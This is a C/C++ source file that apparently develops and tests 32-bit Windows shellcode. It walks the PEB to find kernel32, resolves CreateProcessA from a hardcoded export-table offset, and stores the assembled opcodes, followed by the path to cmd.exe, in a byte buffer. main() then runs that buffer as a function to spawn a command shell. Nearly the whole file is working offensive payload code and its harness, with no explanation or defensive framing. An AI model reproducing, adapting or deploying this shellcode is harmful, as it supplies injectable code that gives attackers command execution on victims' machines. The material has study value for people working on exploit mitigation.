/*#include <iostream>
#include <Windows.h>
#include <wchar.h>

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InMemoryOrderLinks;
    PVOID CodeBase;
    PVOID Reserved2;
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PVOID                         PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;

PPEB GetProcPEB()
{
    __asm mov eax, fs:0x30
}
HMODULE InternalGetModuleHandleW(PWSTR pModuleName)
{
    HMODULE hModule = NULL;
    PPEB ppeb = GetProcPEB();
    PLIST_ENTRY pEntry = &ppeb->Ldr->InMemoryOrderModuleList;
    do {
        pEntry = pEntry->Flink;
        PLDR_DATA_TABLE_ENTRY pDataEntry = (PLDR_DATA_TABLE_ENTRY)pEntry;
        if (0 == wcscmp(pDataEntry->FullDllName.Buffer, pModuleName))
        {
            hModule = (HMODULE)pDataEntry->CodeBase;
            break;
        }
    } while (ppeb->Ldr->InMemoryOrderModuleList.Blink != pEntry);
    return hModule;
}
FARPROC InternalGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    FARPROC pProcAddress = (FARPROC)NULL;
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS32 pImageHeader = (PIMAGE_NT_HEADERS32)((DWORD)hModule + (DWORD)pImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + (DWORD)pImageHeader->OptionalHeader.DataDirectory->VirtualAddress);
    DWORD *pAddressOfNames       = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
    DWORD *pAddressOfFunctions   = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
    WORD *pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);
    for (int i = 0; i < pImageExportDirectory->NumberOfNames; i++)
    {
        //std::cout << i << " - " << (LPCSTR)((DWORD)pAddressOfNames[i] +  (DWORD)hModule) << " - " << pAddressOfNameOrdinals[i] << std::endl; // extra
        if (0 == strcmp((LPCSTR)((DWORD)pAddressOfNames[i] +  (DWORD)hModule), lpProcName))
        {
            pProcAddress = (FARPROC)(pAddressOfFunctions[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
            break;
        }
    }
    return pProcAddress;
}
typedef BOOL (*CREATE_PROCESS_A_PROC)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);*/
void shellcode_asm(void)
{
    __asm {
        nop
        nop
		nop
		nop
        // HMODULE hModule = GetModuleHandleW(L"kernel32.dll");
        mov    eax, fs:0x30              ; PEB
        mov    eax, [eax+0x0c]         ; PEB->Ldr
        mov    eax, [eax+0x14]         ; PEB->Ldr->InMemOrderModuleList
        mov    eax, [eax]                ; pEntry = pEntry->Flink
        mov    eax, [eax]                ; pEntry = pEntry->Flink
        mov    eax, [eax+0x10]         ; kernel32.dll hModule (CodeBase)

        // FARPROC proc = GetProcAddress(hModule, "CreateProcessA");
        mov    ebx, [eax+0x3c]         ; pImageDosHeader->e_lfanew
        mov    ebx, [ebx+eax+0x78]   ; pImageHeader->OptionalHeader.DataDirectory->VirtualAddress
        mov    ebx, [ebx+eax+0x1c]   ; pImageExportDirectory->AddressOfFunctions
        mov    ebx, [ebx+eax+0x0298] ; pAddressOfFunctions[CreateProcessA]
        add    eax, ebx              ; CreateProcessA

        // Memory allocation and initialization
        push   ebp
        mov    ebp, esp
        and    esp, 0xfffffff8
        xor    ebx, ebx
        mov    ecx, 0x16
clear:
        push   ebx
        dec    ecx
        cmp    ecx, ebx
        jne    clear

        mov    [esp + 0x10], 0x44

        push   esp
        lea    ecx, [esp + 0x14]
        push   ecx
        mov    ecx, 0x07
args:
        push   ebx
        dec    ecx
        cmp    ecx, ebx
        jne    args
        jmp    cmd
create_process:
        call   eax
        mov    esp, ebp
        pop    ebp
        ret                         ; 0xc3, remove and decrement the jmp offset
cmd:
        call   create_process
        nop                         ; application name
        nop
		nop
		nop
    }
}
const unsigned char buffer[] = {
  0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c, 0x8b,
  0x40, 0x14, 0x8b, 0x00, 0x8b, 0x00, 0x8b, 0x40, 0x10, 0x8b,
  0x58, 0x3c, 0x8b, 0x5c, 0x03, 0x78, 0x8b, 0x5c, 0x03, 0x1c,
  0x8b, 0x9c, 0x03, 0x98, 0x02, 0x00, 0x00, 0x03, 0xc3, 0x55,
  0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x33, 0xdb, 0xb9, 0x16, 0x00,
  0x00, 0x00, 0x53, 0x49, 0x3b, 0xcb, 0x75, 0xfa, 0xc6, 0x44,
  0x24, 0x10, 0x44, 0x54, 0x8d, 0x4c, 0x24, 0x14, 0x51, 0xb9,
  0x07, 0x00, 0x00, 0x00, 0x53, 0x49, 0x3b, 0xcb, 0x75, 0xfa,
  0xeb, 0x06, 0xff, 0xd0, 0x8b, 0xe5, 0x5d, 0xc3, 0xe8, 0xf5,
  0xff, 0xff, 0xff,
  'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0x00
};
void (*shellcode)(void) = (void(*)(void))&buffer[0];
int main(int argc, char **argv)
{
    shellcode();
    return 0;
}
